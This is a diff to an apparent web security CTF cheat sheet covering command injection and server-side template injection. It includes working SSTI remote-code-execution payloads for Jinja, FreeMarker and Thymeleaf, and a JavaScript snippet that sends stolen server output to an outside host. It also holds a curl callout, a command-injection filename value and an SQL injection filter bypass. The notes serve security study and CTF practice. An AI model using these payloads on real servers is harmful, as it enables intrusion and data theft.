@@ -162,28 +162,48 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
         - ~/share/ctf/seccon2020/milk-solver.js
 - [Multiple vulnerabilities that can result in RCE · Issue \#1122 · Codiad/Codiad · GitHub](https://github.com/Codiad/Codiad/issues/1122)
 
-# server-side template injection (SSTI)
+# command injection
 
-jinja:
+- URL parameter
+    - `file="'$(sleep 5)'a.gif`
 
-```html
-{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+- [#863956 \[extra-asciinema\] Command Injection via insecure command formatting](https://hackerone.com/reports/863956)
+    - [Avoid\-Command\-Injection\-Node\.md · GitHub](https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b)
 
-<script>
-// Payload: {{ ''.class_.__mro__[1].__subclasses__()[412]("cat server.py", shell=True, stdout=-1).communicate() }}
-fetch('http://localhost:5000/',{
-    method: 'POST',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    body: "url=1&score=1&feedback=%7B%7B%20%27%27.__class__.__ mro__%5B1%5D.__ subclasses__%2829%5B412%5D%28%22cat%20server.py%22%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%20%7D%7D&nam=1"}).then(response => response.text()).then(data => fetch("http://demo.itmo.xyz/?nnn="+encodeURI(data)).then(response => document.write(response)));
-</script>
-```
+### server-side template injection (SSTI)
 
-spring, thymeleaf:
+- jinja
+    ```html
+    {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
 
-```
-GET /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1
-```
-    https://github.com/veracode-research/spring-view-manipulation/
+    <script>
+    // Payload: {{ ''.class_.__mro__[1].__subclasses__()[412]("cat server.py", shell=True, stdout=-1).communicate() }}
+    fetch('http://localhost:5000/',{
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: "url=1&score=1&feedback=%7B%7B%20%27%27.__class__.__ mro__%5B1%5D.__ subclasses__%2829%5B412%5D%28%22cat%20server.py%22%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%20%7D%7D&nam=1"}).then(response => response.text()).then(data => fetch("http://demo.itmo.xyz/?nnn="+encodeURI(data)).then(response => document.write(response)));
+    </script>
+    ```
+
+- freemarker
+    ```java
+    // https://ruvlol.medium.com/rce-in-jira-cve-2019-11581-901b845f0f
+    $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://avtohanter.ru/rcetest?a=a').waitFor()
+
+    // https://cyc10n3.medium.com/rce-via-server-side-template-injection-ad46f8e0c2ae
+    ${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("ls")}
+    ```
+
+- spring, thymeleaf
+    ```
+    // https://github.com/veracode-research/spring-view-manipulation/
+    GET /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1
+    ```
+
+- [ZAP-ESUP: ZAP Efficient Scanner for Server Side Template](https://fenix.tecnico.ulisboa.pt/downloadFile/563345090416415/79039-Diogo-silva-thesis.pdf)
+    - p. 51: payloads
+    - p. 52: polyglot - `<#set($x<%={{={@{#{${xux}}%>)`
 
 # server-side request forgery (SSRF)
 
@@ -542,16 +562,6 @@ j:[{"id":1,"body":["foo'"]}]
     - https://github.com/saw-your-packet/ctfs/blob/master/DarkCTF/Write-ups.md#dusty-notes
         - https://artsploit.blogspot.com/2016/08/pprce2.html
 
-# command injection
-
-```
-filename="'$(sleep 5)'a.gif"
-```
-
-- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
-- [#863956 \[extra-asciinema\] Command Injection via insecure command formatting](https://hackerone.com/reports/863956)
-    - [Avoid\-Command\-Injection\-Node\.md · GitHub](https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b)
-
 # deserialization
 
 - https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html
@@ -688,7 +698,7 @@ nginx:
     Content-Type: application/x-www-form-urlencoded;/json
     {"q":"' \u0075nion \u0073elect '1"}
     ```
-- url encoding, utf-8 translation levels
+- url encoding, unicode utf-8 translation levels
     - https://www.cgisecurity.com/lib/URLEmbeddedAttacks.html
     - given `\r\n` in url: http request splitting
         - https://github.com/p4-team/ctf/tree/master/2019-11-14-dragon-finals/cat_flag
